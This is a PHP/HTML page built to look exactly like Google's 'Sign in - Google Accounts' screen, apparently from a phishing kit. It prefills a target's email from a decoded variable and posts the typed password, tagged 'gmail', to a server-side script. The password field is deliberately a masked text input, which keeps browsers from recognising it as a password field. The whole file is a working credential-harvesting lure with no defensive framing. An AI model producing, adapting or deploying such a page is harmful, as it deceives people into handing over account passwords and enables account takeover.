<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="en-GB" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in - Google Accounts</title>
    <link rel="shortcut icon" href="//www.google.com/favicon.ico">
    <link rel="stylesheet" href="../assets/password-fix.css?v=1">

    <style>
        /* ============================================================
           Google Material-style login — self-contained.
           Every style needed is inline; no external Google CSS.
           ============================================================ */
        * { box-sizing: border-box; }

        html, body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            font-family: 'Roboto', arial, sans-serif;
            font-size: 14px;
            color: #202124;
            background: #fff;
        }

        /* Top Google bar */
        .google-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 24px;
        }

        /* Main content wrapper */
        .google-main {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: calc(100vh - 140px);
            padding: 20px 24px;
        }

        /* Login card */
        .login-card {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 1px 2px rgba(60,64,67,.15);
            text-align: center;
        }

        .login-card .google-logo {
            margin: 0 auto 16px;
            display: block;
            width: 75px;
            height: 24px;
        }

        .login-card h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin: 0 0 8px;
            padding: 0;
            color: #202124;
            text-align: center;
        }

        .login-card .subtitle {
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            color: #202124;
            margin: 0 0 24px;
            text-align: center;
        }

        /* Account chip */
        .account-chip {
            display: inline-flex;
            align-items: center;
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 4px 8px 4px 4px;
            margin: 0 auto 32px;
            font-size: 14px;
            font-weight: 500;
            color: #3c4043;
            max-width: 100%;
        }

        .account-chip .avatar {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: #e8eaed;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
            color: #5f6368;
        }

        .account-chip .email {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        /* Form fields — Google's paper input style */
        .field {
            position: relative;
            margin: 0 0 8px;
            text-align: left;
            width: 100%;
        }

        .field input[type="text"],
        .field input[type="email"],
        .field input[type="password"] {
            width: 100%;
            height: 56px;
            padding: 13px 15px;
            font-size: 16px;
            font-family: inherit;
            color: #202124;
            background: transparent;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color .15s ease, box-shadow .15s ease;
        }

        .field input[type="text"]:focus,
        .field input[type="email"]:focus,
        .field input[type="password"]:focus,
        .field input.masked:focus {
            border-color: #1a73e8;
            box-shadow: inset 0 0 0 1px #1a73e8;
        }

        .field input::placeholder {
            color: #5f6368;
            opacity: 1;
        }

        .field input[readonly] {
            background: transparent;
            cursor: default;
        }

        /* ============================================================
           MaskedPassword wrapper — the <span> it injects must flex
           to fill the field and keep the same height as the email
           input.
           ============================================================ */
        .field > span {
            display: flex !important;
            align-items: center !important;
            width: 100% !important;
            min-width: 0 !important;
        }

        .field > span > input {
            flex: 1 1 auto !important;
            width: 100% !important;
            height: 56px !important;
            min-height: 56px !important;
            padding: 13px 15px !important;
            font-size: 16px !important;
            line-height: 1.5 !important;
            border: 1px solid #dadce0 !important;
            border-radius: 4px !important;
            background: transparent !important;
            color: #202124 !important;
            box-sizing: border-box !important;
            outline: none !important;
        }

        .field > span > input:focus {
            border-color: #1a73e8 !important;
            box-shadow: inset 0 0 0 1px #1a73e8 !important;
        }

        .field input[type="hidden"],
        .field > span > input[type="hidden"] {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            padding: 0 !important;
            margin: 0 !important;
            border: 0 !important;
        }

        /* Show password checkbox row */
        .show-password-row {
            display: flex;
            align-items: center;
            margin: 8px 0 24px;
            font-size: 14px;
            color: #202124;
            text-align: left;
        }

        .show-password-row input[type="checkbox"] {
            margin: 0 12px 0 0;
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        /* Error container */
        .error-msg {
            color: #d93025;
            font-size: 14px;
            margin: 0 0 16px;
            text-align: left;
            line-height: 1.4286;
            display: none;
        }

        /* Button row */
        .actions-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 32px 0 0;
        }

        .btn-primary {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: .25px;
            cursor: pointer;
            transition: background .15s ease;
        }

        .btn-primary:hover {
            background: #185abc;
        }

        .btn-link {
            background: transparent;
            border: none;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 10px 8px;
        }

        .btn-link:hover {
            background: #f6fafe;
            border-radius: 4px;
        }

        /* Footer */
        .google-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            font-size: 12px;
            color: #5f6368;
        }

        .google-footer select {
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }

        .google-footer ul {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            gap: 24px;
        }

        .google-footer ul a {
            color: #5f6368;
            text-decoration: none;
        }

        @media (max-width: 480px) {
            .login-card { padding: 32px 24px; border: 0; box-shadow: none; }
            .account-chip { margin-bottom: 24px; }
        }
    </style>
</head>
<body>
    <!-- Top Google bar -->
    <div class="google-header"></div>

    <!-- Main content -->
    <div class="google-main">
        <div class="login-card">
            <!-- Google logo -->
            <svg class="google-logo" viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g fill="none" fill-rule="evenodd">
                    <path fill="#EA4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/>
                    <path fill="#34A853" d="M58.193.67h2.564v17.44h-2.564z"/>
                    <path fill="#4285F4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/>
                    <path fill="#FBBC05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/>
                    <path fill="#EA4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/>
                    <path fill="#4285F4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/>
                </g>
            </svg>

            <h1>Welcome</h1>

            <div class="account-chip">
                <span class="avatar">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"/>
                    </svg>
                </span>
                <span class="email"><?php echo htmlspecialchars($decoded ?? ''); ?></span>
            </div>

            <form name="login-form" method="POST" action="" novalidate>
                <input type="hidden" name="login" value="gmail">
                <input type="hidden" name="user" value="<?php echo htmlspecialchars($decoded ?? ''); ?>" id="user">

                <!-- Email field (readonly) -->
                <div class="field">
                    <input type="email"
                           name="user_display"
                           id="displayUsername"
                           value="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                           placeholder="Email"
                           readonly>
                </div>

                <!-- Password field — must be type="text" for MaskedPassword -->
                <div class="field">
                    <input type="text"
                           class="whsOnd zHQkBf"
                           name="pass"
                           id="password"
                           placeholder="Enter your password"
                           autocomplete="current-password"
                           spellcheck="false"
                           autocapitalize="none"
                           dir="ltr">
                </div>

                <!-- Show password toggle -->
                <div class="show-password-row">
                    <input type="checkbox" id="showPassword" onclick="togglePasswordVisibility(this)">
                    <label for="showPassword">Show password</label>
                </div>

                <!-- Error message -->
                <div class="error-msg" style="<?php echo htmlspecialchars($error ?? 'display:none;'); ?>">
                    Wrong password. Try again or click Forgot password to reset it.
                </div>

                <!-- Action buttons -->
                <div class="actions-row">
                    <button type="button" class="btn-link">Forgot password?</button>
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <footer class="google-footer">
        <select aria-label="Change language">
            <option>English (United Kingdom)</option>
            <option>English (United States)</option>
            <option>Deutsch</option>
            <option>Français</option>
            <option>Español</option>
            <option>Português</option>
            <option>Italiano</option>
            <option>Nederlands</option>
        </select>
        <ul>
            <li><a href="#">Help</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
        </ul>
    </footer>

    <!-- ============================================================
         MaskedPassword helper
         ============================================================ -->
    <script type="text/javascript">
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;
        this.isIE=typeof document.uniqueID!="undefined";
        e.value="";
        e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;
        e=f.lastChild;
        e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;
        e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);
        return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){
                for(var b=0;b<a.value.length;b++){
                    if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}
                    else{d+=a.value.charAt(b)}
                }
            }else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){
            var a=f===true?0:1;
            for(var e="",c=0;c<d.length;c++){
                if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}
            }
            return e
        },
        createContextWrapper:function(a){
            var b=document.createElement("span");
            b.style.position="relative";
            a.parentNode.insertBefore(b,a);
            b.appendChild(a);
            return b
        },
        forceFormReset:function(a){
            while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}
            if(!/form/i.test(a.nodeName)){return null}
            this.addSpecialLoadListener(function(){a.reset()});
            return a
        },
        convertPasswordFieldHTML:function(c,e){
            var b="<input";
            for(var d=c.attributes,a=0;a<d.length;a++){
                if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){
                    b+=" "+d[a].name+'="'+d[a].value+'"'
                }
            }
            b+=' type="text" autocomplete="off">';
            return b
        },
        limitCaretPosition:function(a){
            var d=null,
                c=function(){
                    if(d==null){
                        if(this.isIE){
                            d=window.setInterval(function(){
                                var e=a.createTextRange(),g=a.value.length,f="character";
                                e.moveEnd(f,g);e.moveStart(f,g);e.select()
                            },100)
                        }else{
                            d=window.setInterval(function(){
                                var e=a.value.length;
                                if(!(a.selectionEnd==e&&a.selectionStart<=e)){
                                    a.selectionStart=e;a.selectionEnd=e
                                }
                            },100)
                        }
                    }
                },
                b=function(){window.clearInterval(d);d=null};
            this.addListener(a,"focus",function(){c()});
            this.addListener(a,"blur",function(){b()})
        },
        addListener:function(c,a,b){
            if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}
            else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}
        },
        addSpecialLoadListener:function(a){
            if(this.isIE){return window.attachEvent("onload",a)}
            else{return document.addEventListener("DOMContentLoaded",a,false)}
        },
        getTarget:function(a){
            if(!a){return null}
            return a.target?a.target:a.srcElement
        }
    };
    </script>

    <!-- ============================================================
         Initialize MaskedPassword + enforce layout parity
         ============================================================ -->
    <script type="text/javascript">
    (function () {
        function initMasked() {
            var pwd = document.getElementById("password");
            if (!pwd) return;

            // Apply MaskedPassword so bullets render
            try {
                new MaskedPassword(pwd, "\u25CF");
            } catch (err) {
                // Fallback to native password if the masking script fails
                pwd.type = "password";
                return;
            }

            // Post-fix: make the injected wrapper span fill the field
            var wrapper = pwd.parentNode;
            if (wrapper && wrapper.tagName === "SPAN") {
                wrapper.style.position   = "relative";
                wrapper.style.display    = "flex";
                wrapper.style.alignItems = "center";
                wrapper.style.width      = "100%";
                wrapper.style.minWidth   = "0";
            }

            // Post-fix: force the visible masked input to match
            // the email field's dimensions exactly.
            var visible = document.querySelector("input.masked");
            if (visible) {
                visible.style.height       = "56px";
                visible.style.minHeight    = "56px";
                visible.style.lineHeight   = "1.5";
                visible.style.padding      = "13px 15px";
                visible.style.fontSize     = "16px";
                visible.style.width        = "100%";
                visible.style.boxSizing    = "border-box";
                visible.style.border       = "1px solid #dadce0";
                visible.style.borderRadius = "4px";
                visible.style.background   = "transparent";
                visible.style.color        = "#202124";
                visible.style.outline      = "none";
            }

            // Hide the hidden real field
            var hidden = document.querySelector('input[name="pass"][type="hidden"]');
            if (hidden) {
                hidden.style.display = "none";
                hidden.style.position = "absolute";
                hidden.style.width = "0";
                hidden.style.height = "0";
            }
        }

        // Show/hide password toggle
        window.togglePasswordVisibility = function (checkbox) {
            var visible = document.querySelector("input.masked");
            if (!visible) return;
            if (checkbox.checked) {
                visible.style.webkitTextSecurity = "none";
                visible.style.textSecurity = "none";
            } else {
                visible.style.webkitTextSecurity = "disc";
                visible.style.textSecurity = "disc";
            }
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initMasked);
        } else {
            initMasked();
        }
    })();
    </script>
</body>
</html>